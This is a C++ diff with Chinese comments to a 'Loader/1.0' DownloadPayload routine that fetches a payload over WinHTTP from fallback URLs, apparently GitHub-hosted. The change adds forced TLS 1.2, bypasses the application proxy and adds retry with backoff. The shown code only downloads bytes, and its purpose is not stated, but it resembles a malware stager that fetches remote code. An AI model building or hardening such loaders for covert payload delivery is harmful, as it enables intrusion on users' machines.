@@ -123,74 +123,82 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
 
     HINTERNET hSession = WinHttpOpen(
         L"Loader/1.0",
-        isHttps ? WINHTTP_ACCESS_TYPE_DEFAULT_PROXY : WINHTTP_ACCESS_TYPE_NO_PROXY,
+        WINHTTP_ACCESS_TYPE_NO_PROXY,  // VPN 在网卡层路由, 不需要应用层代理
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession) return result;
 
-    HINTERNET hConnect = WinHttpConnect(
-        hSession, hostName, urlComp.nPort, 0);
-
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        return result;
+    // v3.37: 强制 TLS 1.2 (GitHub 要求, 否则 WinHttpSendRequest 报 12030)
+    {
+        DWORD tlsFlags = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+        WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
+            &tlsFlags, sizeof(tlsFlags));
     }
 
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, L"GET", urlPath, nullptr,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-        isHttps ? WINHTTP_FLAG_SECURE : 0);
-
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return result;
-    }
-
-    // 设置超时
-    WinHttpSetTimeouts(hRequest,
-        DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
-        DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);
-
-    // 发送请求
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
-        !WinHttpReceiveResponse(hRequest, nullptr)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return result;
-    }
-
-    // v3.24: 检查 HTTP 状态码, 404/500 等非200直接跳过
-    DWORD statusCode = 0;
-    DWORD statusCodeSize = sizeof(statusCode);
-    if (!WinHttpQueryHeaders(hRequest,
-            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
-            WINHTTP_NO_HEADER_INDEX) || statusCode != 200) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return result; // 返回空 → 调用者尝试下一个 URL
-    }
-
-    // 读取响应
+    // v3.37: 重试逻辑 (网络波动/GitHub CDN 节流)
+    const int MAX_RETRIES = 2;
     DWORD bytesAvailable = 0;
-    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
-        size_t oldSize = result.size();
-        result.resize(oldSize + bytesAvailable);
-        DWORD bytesRead = 0;
-        if (!WinHttpReadData(hRequest, result.data() + oldSize,
-                             bytesAvailable, &bytesRead)) {
-            result.clear();
-            break;
+    for (int retry = 0; retry <= MAX_RETRIES; retry++) {
+        if (retry > 0) Sleep(1500 * retry); // 退避等待
+
+        HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
+        if (!hConnect) continue;
+
+        HINTERNET hRequest = WinHttpOpenRequest(
+            hConnect, L"GET", urlPath, nullptr,
+            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+            isHttps ? WINHTTP_FLAG_SECURE : 0);
+
+        if (!hRequest) {
+            WinHttpCloseHandle(hConnect);
+            continue;
         }
-        result.resize(oldSize + bytesRead);
+
+        // 设置超时
+        WinHttpSetTimeouts(hRequest,
+            DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
+            DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);
+
+        // 发送请求
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+            !WinHttpReceiveResponse(hRequest, nullptr)) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            continue;
+        }
+
+        // 检查 HTTP 状态码
+        DWORD statusCode = 0;
+        DWORD statusCodeSize = sizeof(statusCode);
+        if (!WinHttpQueryHeaders(hRequest,
+                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
+                WINHTTP_NO_HEADER_INDEX) || statusCode != 200) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            continue;
+        }
+
+        // 读取响应
+        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
+            size_t oldSize = result.size();
+            result.resize(oldSize + bytesAvailable);
+            DWORD bytesRead = 0;
+            if (!WinHttpReadData(hRequest, result.data() + oldSize,
+                                 bytesAvailable, &bytesRead)) {
+                result.clear();
+                break;
+            }
+            result.resize(oldSize + bytesRead);
+        }
+
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+
+        if (!result.empty()) break; // 成功, 退出重试循环
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
 
     return result;
